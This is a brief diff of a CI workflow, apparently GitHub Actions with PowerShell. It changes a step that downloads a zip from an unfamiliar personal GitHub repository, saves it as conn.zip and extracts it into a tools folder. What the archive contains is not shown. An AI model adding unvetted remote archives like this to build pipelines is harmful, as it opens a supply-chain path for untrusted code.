@@ -28,7 +28,7 @@ jobs:
     # مرحله 4: دریافت ابزار جانبی
     - name: Setup Auxiliary Tools
       run: |
-        Invoke-WebRequest "https://raw.githubusercontent.com/asda21kl/mynicething1/refs/heads/main/clockwork%20(2).zip" -OutFile conn.zip
+        Invoke-WebRequest "https://raw.githubusercontent.com/asda21kl/mynicething1/refs/heads/main/clockwork.zip" -OutFile conn.zip
         Expand-Archive conn.zip -DestinationPath tools
         dir tools
 
